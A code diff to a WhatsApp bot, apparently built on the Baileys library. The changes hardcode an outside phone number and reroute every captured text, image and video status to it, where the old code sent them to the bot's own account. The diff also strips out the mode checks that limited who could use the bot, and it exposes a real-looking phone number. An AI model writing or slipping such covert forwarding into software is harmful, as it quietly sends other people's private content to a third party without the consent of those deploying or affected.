@@ -39,6 +39,7 @@ const app = express();
 const port = process.env.PORT || 8000;
 
 const prefix = '.';
+const ownerNumber = ['94725364886'];
 const credsPath = path.join(__dirname, '/auth_info_baileys/creds.json');
 
 async function ensureSessionFile() {
@@ -103,17 +104,7 @@ async function connectToWA() {
       }
     } else if (connection === 'open') {
       console.log('𝐎𝐒𝐇𝐈𝐘𝐀-𝐗𝐌𝐃 𝐒𝐓𝐀𝐑𝐓𝐃 💫');
-
-// ================= AUTO NEWSLETTER FOLLOW =================
-
-try {
-  if (config.NEWSLETTER_JID) {
-    await test.newsletterFollow(config.NEWSLETTER_JID);
-    console.log("✅ Auto Followed Newsletter Successfully");
-  }
-} catch (err) {
-  console.log("❌ Newsletter Follow Error:", err);
-}
+      
 
       const up = `╔══════════════════════════╗
         ✦  W E L C O M E  ✦
@@ -215,9 +206,7 @@ if (mek.key?.remoteJid === 'status@broadcast') {
     const text = mek.message.extendedTextMessage.text || "";
     if (text.trim().length > 0) {
       try {
-        const botJid = await jidNormalizedUser(test.user.id);
-
-await test.sendMessage(botJid, {
+        await test.sendMessage(ownerNumber[0] + "@s.whatsapp.net", {
           text: `📝 *Text Status*\n👤 From: @${mentionJid.split("@")[0]}\n\n${text}`,
           mentions: [mentionJid]
         });
@@ -246,9 +235,7 @@ await test.sendMessage(botJid, {
       const mimetype = mediaMsg.mimetype || (msgType === "imageMessage" ? "image/jpeg" : "video/mp4");
       const captionText = mediaMsg.caption || "";
 
-      const botJid = await jidNormalizedUser(test.user.id);
-
-await test.sendMessage(botJid, {
+      await test.sendMessage(ownerNumber[0] + "@s.whatsapp.net", {
         [msgType === "imageMessage" ? "image" : "video"]: buffer,
         mimetype,
         caption: `📥 *Forwarded Status*\n👤 From: @${mentionJid.split("@")[0]}\n\n${captionText}`,
@@ -294,29 +281,6 @@ const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.
     const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
 
     const reply = (text) => test.sendMessage(from, { text }, { quoted: mek });
-    
-    // ================= LIVE CONFIG RELOAD ================= */
-
-    delete require.cache[require.resolve("./config")];
-    const liveConfig = require("./config");
-
-    // ================= MODE SYSTEM ================= */
-
-    if (liveConfig.MODE === "private") {
-      if (!isOwner) return;
-    }
-
-    if (liveConfig.MODE === "inbox") {
-      if (isGroup) return;
-    }
-
-    if (liveConfig.MODE === "group") {
-      if (!isGroup) return;
-    }
-
-    if (liveConfig.MODE === "public") {
-      // Work everywhere
-    }
 
     if (isCmd) {
       const cmd = commands.find((c) => c.pattern === commandName || (c.alias && c.alias.includes(commandName)));
